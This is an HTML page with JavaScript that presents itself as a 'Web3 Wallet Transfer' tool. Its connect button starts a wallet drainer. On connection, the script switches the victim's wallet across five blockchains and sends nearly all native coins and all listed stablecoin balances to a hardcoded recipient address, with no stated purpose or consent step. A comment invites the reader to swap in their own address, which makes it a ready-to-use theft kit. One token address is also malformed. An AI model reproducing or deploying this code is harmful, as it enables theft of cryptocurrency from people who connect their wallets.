<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 Wallet Connection & Crypto Transfer</title>
    <style>
        /* Styling omitted for brevity */
    </style>
</head>
<body>
    <div class="container">
        <h1>Web3 Wallet Transfer</h1>
        <nav>
            <a href="#home">Home</a>
            <a href="#about">About</a>
        </nav>
        
        <section id="home">
            <h2>Connect Wallet & Send Crypto</h2>
            <button id="connectWallet">Connect Wallet</button>
            <button id="disconnectWallet" disabled>Disconnect Wallet</button>
            <p id="status"></p>
        </section>

        <footer>
            <p>&copy; 2024 Web3 Crypto Transfer Tool</p>
        </footer>

        <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
        <script>
            let provider;
            let signer;
            let userAddress = "";

            // Destination wallet (replace with your own)
            const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8";

            // List of networks with RPC URLs and native symbols
            const networks = [
                { chainId: 1, name: 'Ethereum', nativeSymbol: 'ETH', rpcUrls: ['https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'] },
                { chainId: 56, name: 'Binance Smart Chain', nativeSymbol: 'BNB', rpcUrls: ['https://bsc-dataseed.binance.org/'] },
                { chainId: 137, name: 'Polygon', nativeSymbol: 'MATIC', rpcUrls: ['https://rpc-mainnet.matic.network'] },
                { chainId: 43114, name: 'Avalanche', nativeSymbol: 'AVAX', rpcUrls: ['https://api.avax.network/ext/bc/C/rpc'] },
                { chainId: 42161, name: 'Arbitrum One', nativeSymbol: 'ETH', rpcUrls: ['https://arb1.arbitrum.io/rpc'] }
            ];

            // List of ERC-20 tokens for each chain
            const erc20Tokens = {
                1: [{ address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, symbol: "USDT" }],
                56: [{ address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18, symbol: "BUSD" }],
                137: [{ address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6, symbol: "USDC" }],
                43114: [{ address: "0xB97EF9Ef8734C71904D8002F8B6Bc66D9B1E1D8", decimals: 18, symbol: "USDC" }],
                42161: [{ address: "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8", decimals: 6, symbol: "USDC" }]
            };

            // Handle Wallet Connection
            document.getElementById('connectWallet').addEventListener('click', async () => {
                try {
                    if (!window.ethereum) {
                        document.getElementById('status').innerText = "MetaMask is not installed. Please install MetaMask and try again.";
                        return;
                    }

                    // Request account access
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    signer = provider.getSigner();
                    userAddress = await signer.getAddress();

                    // Update UI and enable the disconnect button
                    document.getElementById('status').innerText = `Connected: ${userAddress}`;
                    document.getElementById('disconnectWallet').disabled = false;
                    
                    console.log(`Wallet connected: ${userAddress}`);
                    await sendCrypto(); // Proceed to sending crypto if connection is successful
                } catch (error) {
                    console.error(`Error during connection: ${error.message}`);
                    document.getElementById('status').innerText = `Connection failed: ${error.message}`;
                }
            });

            // Handle Wallet Disconnection
            document.getElementById('disconnectWallet').addEventListener('click', () => {
                userAddress = "";
                signer = null;
                document.getElementById('status').innerText = "Wallet disconnected.";
                document.getElementById('disconnectWallet').disabled = true;
                console.log("Wallet disconnected.");
            });

            // Function to send crypto across different networks
            async function sendCrypto() {
                for (const network of networks) {
                    await switchNetwork(network.chainId);

                    const balance = await provider.getBalance(userAddress);
                    const amountToSend = balance.sub(ethers.utils.parseUnits('0.001', 18)); // Keep some balance for gas fees

                    if (amountToSend.lte(0)) {
                        document.getElementById('status').innerText += `\nInsufficient balance on ${network.name}. Skipping to the next network.`;
                        continue;
                    }

                    // Send native token
                    const tx = {
                        to: recipientAddress,
                        value: amountToSend
                    };

                    const transactionResponse = await signer.sendTransaction(tx);
                    await transactionResponse.wait();

                    document.getElementById('status').innerText += `\nSent ${ethers.utils.formatEther(amountToSend)} ${network.nativeSymbol} to ${recipientAddress} on ${network.name}.`;

                    // Send ERC-20 tokens
                    await sendAllERC20Tokens(network);
                }

                document.getElementById('status').innerText += "\nAll transactions processed.";
            }

            // Switch network and add if missing
            async function switchNetwork(chainId) {
                try {
                    const network = networks.find(net => net.chainId === chainId);
                    await provider.send('wallet_switchEthereumChain', [{ chainId: `0x${chainId.toString(16)}` }]);
                    document.getElementById('status').innerText += `\nSwitched to ${network.name}.`;
                } catch (error) {
                    if (error.code === 4902) {
                        const network = networks.find(net => net.chainId === chainId);
                        await provider.send('wallet_addEthereumChain', [
                            {
                                chainId: `0x${chainId.toString(16)}`,
                                chainName: network.name,
                                nativeCurrency: {
                                    name: network.nativeSymbol,
                                    symbol: network.nativeSymbol,
                                    decimals: 18
                                },
                                rpcUrls: network.rpcUrls
                            }
                        ]);
                        document.getElementById('status').innerText += `\nAdded and switched to ${network.name}.`;
                    } else {
                        console.error(`Failed to switch network: ${error.message}`);
                        document.getElementById('status').innerText += `\nError switching to ${chainId}: ${error.message}`;
                    }
                }
            }

            // Send ERC-20 tokens on each network
            async function sendAllERC20Tokens(network) {
                const tokens = erc20Tokens[network.chainId] || [];
                for (const token of tokens) {
                    const tokenContract = new ethers.Contract(token.address, [
                        "function balanceOf(address) view returns (uint)",
                        "function transfer(address to, uint amount) returns (bool)"
                    ], signer);

                    const tokenBalance = await tokenContract.balanceOf(userAddress);
                    if (tokenBalance.gt(0)) {
                        const transferTx = await tokenContract.transfer(recipientAddress, tokenBalance);
                        await transferTx.wait();
                        document.getElementById('status').innerText += `\nSent ${ethers.utils.formatUnits(tokenBalance, token.decimals)} ${token.symbol} on ${network.name}.`;
                    }
                }
            }
        </script>
    </div>
</body>
</html>
